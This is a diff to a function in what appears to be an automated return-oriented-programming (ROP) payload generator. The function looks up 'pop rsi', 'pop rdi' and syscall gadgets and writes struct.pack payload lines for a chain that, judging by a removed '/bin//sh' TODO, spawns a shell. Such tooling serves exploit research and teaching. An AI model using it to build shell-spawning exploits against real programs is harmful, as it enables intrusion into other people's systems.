@@ -366,8 +366,15 @@ def case2(GadgetList, data_section_addr) :
         # Keep the loop going!
         x = x + 1
 
-    # TODO: Load "/bin//sh" into .data section
-    # TODO: Load address of .data into rbx
+
+    # Put "address of .data onto the stack"
+    # Execute "pop rsi; ret"
+
+    # fd.write("payload += struct.pack('<Q', ")
+    # fd.write(hex(int(data_section_addr)))
+    # fd.write(")")
+    # fd.write("\t\t# Address of .data section")
+    # fd.write("\n\t")
 
     # # rsi <- 0
     rsiList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rsi")
@@ -383,6 +390,41 @@ def case2(GadgetList, data_section_addr) :
                
             # Update payload
             payload += struct.pack("<Q", 0)
+            payload += struct.pack("<Q", int(data_section_addr))
+                
+
+            # Write it into the file
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(data_section_addr))
+            fd.write(")")
+            fd.write("\t\t# Address of .data section")
+            fd.write("\n\t")
+
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst['address'])))
+            fd.write(")")
+            fd.write("\t\t# Address of pop rsi; ret")
+            fd.write("\n\t")
+            break
+        x = x + 1
+
+
+    # rdi <- 0
+    rdiList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdi")
+
+    x = 0
+    while(x < len(rdiList)) : 
+        
+        gadget = rdiList[x]
+        inst = gadget[0]
+        if inst['mnemonic'] == "pop" :
+            # "pop rdi; ret" found. 
+            # Steps to be taken: 
+                # Put 0 in the payload
+                # Execute "pop rdi; ret"
+               
+            # Update payload
+            payload += struct.pack("<Q", 0)
             payload += struct.pack("<Q", int(inst['address']))
                 
 
@@ -392,7 +434,7 @@ def case2(GadgetList, data_section_addr) :
             fd.write("payload += struct.pack('<Q', ")
             fd.write(hex(int(inst['address'])))
             fd.write(")")
-            fd.write("\t\t# Address of pop rsi; ret")
+            fd.write("\t\t# Address of pop rdi; ret")
             fd.write("\n\t")
             break
         x = x + 1
@@ -428,7 +470,12 @@ def case2(GadgetList, data_section_addr) :
 
 
     # Get syscall
-    syscallAddress = get_gadgets.syscall[0][0]
+    syscallList = categorize.checkIfSyscallPresent(GadgetList)
+    syscallGadget = syscallList[0]
+    
+    syscallDict = syscallGadget[0]
+    syscallAddress = syscallDict['address']
+    
     fd.write("payload += struct.pack('<Q', ")
     fd.write(hex(int(syscallAddress)))
     fd.write(")")
